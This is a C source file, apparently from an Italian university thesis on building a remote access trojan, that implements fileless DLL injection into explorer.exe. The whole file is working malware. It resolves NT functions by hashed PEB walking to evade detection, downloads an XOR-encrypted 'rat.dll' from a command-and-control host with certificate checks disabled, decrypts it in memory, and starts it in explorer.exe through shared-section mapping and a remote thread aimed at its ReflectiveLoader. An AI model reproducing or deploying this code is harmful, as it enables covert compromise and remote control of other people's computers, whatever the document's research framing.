/*
 * process_inject.c — Iniezione fileless in explorer.exe
 *
 * Tecnica: NtCreateSection + NtMapViewOfSection (sezione condivisa) +
 *          RtlCreateUserThread
 *
 * MITRE ATT&CK: T1055, T1055.003
 * Giuseppe Alfonso Mangiola, TESI RAT 2026, DIEM UNISA
 */

#include <windows.h>
#include <winhttp.h>
#include <tlhelp32.h>
#include <string.h>

/* ─── Tipi NT nativi ─────────────────────────────────────────────────────── */
typedef LONG NTSTATUS;
#define NT_SUCCESS(s) ((s) >= 0)

typedef enum _SECTION_INHERIT { ViewShare = 1, ViewUnmap = 2 } SECTION_INHERIT;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG  Length;
    HANDLE RootDirectory;
    PVOID  ObjectName;
    ULONG  Attributes;
    PVOID  SecurityDescriptor;
    PVOID  SecurityQualityOfService;
} OBJECT_ATTRIBUTES;

typedef NTSTATUS (NTAPI *pfnNtCreateSection)(
    PHANDLE, ACCESS_MASK, OBJECT_ATTRIBUTES*, PLARGE_INTEGER,
    ULONG, ULONG, HANDLE);

typedef NTSTATUS (NTAPI *pfnNtMapViewOfSection)(
    HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER,
    PSIZE_T, SECTION_INHERIT, ULONG, ULONG);

typedef NTSTATUS (NTAPI *pfnNtUnmapViewOfSection)(HANDLE, PVOID);
typedef NTSTATUS (NTAPI *pfnNtClose)(HANDLE);

typedef NTSTATUS (NTAPI *pfnRtlCreateUserThread)(
    HANDLE, PSECURITY_DESCRIPTOR, BOOL, ULONG, SIZE_T, SIZE_T,
    LPTHREAD_START_ROUTINE, PVOID, PHANDLE, PVOID);

typedef struct {
    pfnNtCreateSection      NtCreateSection;
    pfnNtMapViewOfSection   NtMapViewOfSection;
    pfnNtUnmapViewOfSection NtUnmapViewOfSection;
    pfnNtClose              NtClose;
    pfnRtlCreateUserThread  RtlCreateUserThread;
} NT_FUNCS;

/* ─── PEB walk + EAT hash resolution ────────────────────────────────────── */

#define HASH_NtCreateSection        0x5BB29BCBU
#define HASH_NtMapViewOfSection     0xD5159B94U
#define HASH_NtUnmapViewOfSection   0xF21037D0U
#define HASH_NtClose                0xDCD44C5FU
#define HASH_RtlCreateUserThread    0x442F2041U

static __inline DWORD _pinj_ror13(DWORD v) {
    return (v >> 13) | (v << 19);
}

static __inline DWORD _pinj_hash_ascii(const char *s) {
    DWORD h = 0;
    while (*s) { h = _pinj_ror13(h); h += (BYTE)*s++; }
    return h;
}

static ULONG_PTR _pinj_get_ntdll_base(void) {
    ULONG_PTR peb, ldr, flink, entry;
#ifdef _WIN64
    peb = __readgsqword(0x60);
#else
    peb = __readfsdword(0x30);
#endif
    ldr   = *(ULONG_PTR *)(peb + 0x18);
    flink = *(ULONG_PTR *)(ldr + 0x10);
    entry = flink;
    do {
        USHORT  len = *(USHORT  *)(entry + 0x58);
        WCHAR  *buf = *(WCHAR **)(entry + 0x60);
        if (len == 18 &&
            (buf[0]|0x20)==L'n' && (buf[1]|0x20)==L't' &&
            (buf[2]|0x20)==L'd' && (buf[3]|0x20)==L'l' &&
            (buf[4]|0x20)==L'l') {
            return *(ULONG_PTR *)(entry + 0x30);
        }
        entry = *(ULONG_PTR *)entry;
    } while (entry != flink);
    return 0;
}

static PVOID _pinj_get_proc(DWORD name_hash) {
    ULONG_PTR base = _pinj_get_ntdll_base();
    if (!base) return NULL;
    IMAGE_DOS_HEADER       *dos = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS       *nt  = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY *)(base +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    DWORD *names = (DWORD *)(base + exp->AddressOfNames);
    WORD  *ords  = (WORD  *)(base + exp->AddressOfNameOrdinals);
    DWORD *funcs = (DWORD *)(base + exp->AddressOfFunctions);
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        if (_pinj_hash_ascii((const char *)(base + names[i])) == name_hash)
            return (PVOID)(base + funcs[ords[i]]);
    }
    return NULL;
}

/* ─── Costanti ───────────────────────────────────────────────────────────── */
#define C2_HOST     L"192.168.122.47"
#define C2_PORT     443
#define C2_PATH_DLL L"/update_dll"

static const BYTE g_xorKey[32] = {
    0xD6,0x83,0xF9,0xCE,0x3E,0x3D,0x09,0x12,
    0x15,0xB4,0x22,0xCF,0xEF,0x50,0x9F,0x00,
    0x27,0x98,0x15,0xC0,0xEE,0x74,0x51,0x68,
    0x7C,0x61,0x55,0x99,0xE7,0x43,0xEE,0x28
};

/* ─── Resolve NT funcs via PEB walk ──────────────────────────────────────── */
static int _resolve_nt_funcs(NT_FUNCS *nt) {
    nt->NtCreateSection      = (pfnNtCreateSection)     _pinj_get_proc(HASH_NtCreateSection);
    nt->NtMapViewOfSection   = (pfnNtMapViewOfSection)  _pinj_get_proc(HASH_NtMapViewOfSection);
    nt->NtUnmapViewOfSection = (pfnNtUnmapViewOfSection)_pinj_get_proc(HASH_NtUnmapViewOfSection);
    nt->NtClose              = (pfnNtClose)             _pinj_get_proc(HASH_NtClose);
    nt->RtlCreateUserThread  = (pfnRtlCreateUserThread) _pinj_get_proc(HASH_RtlCreateUserThread);
    return (nt->NtCreateSection && nt->NtMapViewOfSection &&
            nt->NtUnmapViewOfSection && nt->NtClose && nt->RtlCreateUserThread) ? 1 : 0;
}

/* ─── Download DLL cifrata dal C2 ────────────────────────────────────────── */
static BYTE *_download_dll(SIZE_T *pSize) {
    HINTERNET hSess = NULL, hConn = NULL, hReq = NULL;
    BYTE *pBuf = NULL;
    SIZE_T total = 0, cap = 512 * 1024;
    *pSize = 0;

    hSess = WinHttpOpen(L"Mozilla/5.0",
                        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSess) goto done;
    hConn = WinHttpConnect(hSess, C2_HOST, C2_PORT, 0);
    if (!hConn) goto done;
    hReq = WinHttpOpenRequest(hConn, L"GET", C2_PATH_DLL, NULL,
                              WINHTTP_NO_REFERER,
                              WINHTTP_DEFAULT_ACCEPT_TYPES,
                              WINHTTP_FLAG_SECURE);
    if (!hReq) goto done;

    DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA      |
                    SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
                    SECURITY_FLAG_IGNORE_CERT_CN_INVALID  |
                    SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
    WinHttpSetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));

    if (!WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                            WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) goto done;
    if (!WinHttpReceiveResponse(hReq, NULL)) goto done;

    pBuf = (BYTE *)HeapAlloc(GetProcessHeap(), 0, cap);
    if (!pBuf) goto done;

    BYTE tmp[8192]; DWORD dwRead;
    while (WinHttpReadData(hReq, tmp, sizeof(tmp), &dwRead) && dwRead > 0) {
        if (total + dwRead > cap) {
            cap = (total + dwRead) * 2;
            BYTE *pNew = (BYTE *)HeapReAlloc(GetProcessHeap(), 0, pBuf, cap);
            if (!pNew) { HeapFree(GetProcessHeap(), 0, pBuf); pBuf = NULL; goto done; }
            pBuf = pNew;
        }
        memcpy(pBuf + total, tmp, dwRead);
        total += dwRead;
    }
    *pSize = total;

done:
    if (hReq)  WinHttpCloseHandle(hReq);
    if (hConn) WinHttpCloseHandle(hConn);
    if (hSess) WinHttpCloseHandle(hSess);
    return pBuf;
}

/* ─── XOR decrypt in-place ───────────────────────────────────────────────── */
static void _xor_decrypt(BYTE *buf, SIZE_T sz) {
    for (SIZE_T i = 0; i < sz; i++)
        buf[i] ^= g_xorKey[i % 32];
}

/* ─── RVA → offset grezzo nel buffer ─────────────────────────────────────── */
static DWORD _rva_to_raw(DWORD rva, PIMAGE_SECTION_HEADER pS, WORD n) {
    for (WORD i = 0; i < n; i++) {
        if (rva >= pS[i].VirtualAddress &&
            rva <  pS[i].VirtualAddress + pS[i].Misc.VirtualSize)
            return pS[i].PointerToRawData + (rva - pS[i].VirtualAddress);
    }
    return rva;
}

/* ─── Trova offset raw di ReflectiveLoader tramite PE export table ─────── */
static DWORD _find_reflective_loader(const BYTE *buf, SIZE_T sz) {
    if (sz < sizeof(IMAGE_DOS_HEADER)) return 0;
    PIMAGE_DOS_HEADER    pDos = (PIMAGE_DOS_HEADER)buf;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    PIMAGE_NT_HEADERS64  pNt  = (PIMAGE_NT_HEADERS64)(buf + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) return 0;

    WORD  nSects = pNt->FileHeader.NumberOfSections;
    PIMAGE_SECTION_HEADER pSects = IMAGE_FIRST_SECTION(pNt);

    DWORD expRVA = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!expRVA) return 0;
    DWORD expRaw = _rva_to_raw(expRVA, pSects, nSects);
    if (expRaw + sizeof(IMAGE_EXPORT_DIRECTORY) > (DWORD)sz) return 0;

    PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)(buf + expRaw);
    DWORD  nNames = pExp->NumberOfNames;
    DWORD *pNames = (DWORD *)(buf + _rva_to_raw(pExp->AddressOfNames,        pSects, nSects));
    WORD  *pOrds  = (WORD  *)(buf + _rva_to_raw(pExp->AddressOfNameOrdinals, pSects, nSects));
    DWORD *pFuncs = (DWORD *)(buf + _rva_to_raw(pExp->AddressOfFunctions,    pSects, nSects));

    for (DWORD i = 0; i < nNames; i++) {
        const char *name = (const char *)(buf + _rva_to_raw(pNames[i], pSects, nSects));
        if (strncmp(name, "ReflectiveLoader", 16) == 0) {
            WORD ord = pOrds[i];
            return _rva_to_raw(pFuncs[ord], pSects, nSects);
        }
    }
    return 0;
}

/* ─── PID di explorer.exe (stessa sessione) ──────────────────────────────── */
static DWORD _get_explorer_pid(void) {
    DWORD pid = 0, mySession = 0;
    ProcessIdToSessionId(GetCurrentProcessId(), &mySession);
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe = { sizeof(pe) };
    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"explorer.exe") == 0) {
                DWORD sess = 0;
                ProcessIdToSessionId(pe.th32ProcessID, &sess);
                if (sess == mySession) { pid = pe.th32ProcessID; break; }
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return pid;
}

/* ─────────────────────────────────────────────────────────────────────────────
 * inject_dll_into_explorer
 *
 * 1. Scarica rat.dll cifrata da /update_dll
 * 2. XOR decrypt in RAM
 * 3. Trova ReflectiveLoader via PE export table
 * 4. NtCreateSection — sezione kernel condivisa
 * 5. NtMapViewOfSection locale (RW) → memcpy DLL
 * 6. NtMapViewOfSection in explorer.exe (RX)
 * 7. RtlCreateUserThread → ReflectiveLoader in explorer.exe
 *
 * Ritorna 0 se ok, -1 se fallisce.
 * ─────────────────────────────────────────────────────────────────────────────*/
int inject_dll_into_explorer(void) {
    NT_FUNCS nt     = {0};
    BYTE    *pDll   = NULL;
    SIZE_T   dllSz  = 0;
    int      result = -1;

    HANDLE hSection  = NULL;
    HANDLE hExplorer = NULL;
    PVOID  pLocal    = NULL;
    PVOID  pRemote   = NULL;
    SIZE_T viewSz    = 0;
    HANDLE hThread   = NULL;

    if (!_resolve_nt_funcs(&nt)) goto cleanup;

    pDll = _download_dll(&dllSz);
    if (!pDll || dllSz < sizeof(IMAGE_DOS_HEADER)) goto cleanup;
    _xor_decrypt(pDll, dllSz);

    DWORD rlOff = _find_reflective_loader(pDll, dllSz);
    if (!rlOff) goto cleanup;

    DWORD explorerPid = _get_explorer_pid();
    if (!explorerPid) goto cleanup;

    hExplorer = OpenProcess(PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD,
                            FALSE, explorerPid);
    if (!hExplorer) goto cleanup;

    /* Sezione condivisa — PAGE_EXECUTE_READWRITE a livello kernel */
    LARGE_INTEGER secSz;
    secSz.QuadPart = (LONGLONG)dllSz;
    NTSTATUS ns = nt.NtCreateSection(&hSection,
        SECTION_ALL_ACCESS, NULL, &secSz,
        PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    if (!NT_SUCCESS(ns)) goto cleanup;

    /* Map locale RW — per copiare */
    viewSz = 0;
    ns = nt.NtMapViewOfSection(hSection, GetCurrentProcess(),
        &pLocal, 0, 0, NULL, &viewSz, ViewShare, 0, PAGE_READWRITE);
    if (!NT_SUCCESS(ns)) goto cleanup;
    memcpy(pLocal, pDll, dllSz);

    /* Map remota RX in explorer.exe */
    viewSz  = 0;
    pRemote = NULL;
    ns = nt.NtMapViewOfSection(hSection, hExplorer,
        &pRemote, 0, 0, NULL, &viewSz, ViewShare, 0, PAGE_EXECUTE_READ);
    if (!NT_SUCCESS(ns)) goto cleanup;

    /* Thread remoto → ReflectiveLoader */
    LPTHREAD_START_ROUTINE pRl =
        (LPTHREAD_START_ROUTINE)((BYTE *)pRemote + rlOff);
    ns = nt.RtlCreateUserThread(hExplorer, NULL, FALSE,
        0, 0, 0, pRl, pRemote, &hThread, NULL);
    if (!NT_SUCCESS(ns)) goto cleanup;

    result = 0;

cleanup:
    if (pLocal)    nt.NtUnmapViewOfSection(GetCurrentProcess(), pLocal);
    if (hSection)  nt.NtClose(hSection);
    if (hThread)   CloseHandle(hThread);
    if (hExplorer) CloseHandle(hExplorer);
    if (pDll) {
        SecureZeroMemory(pDll, dllSz);
        HeapFree(GetProcessHeap(), 0, pDll);
    }
    return result;
}
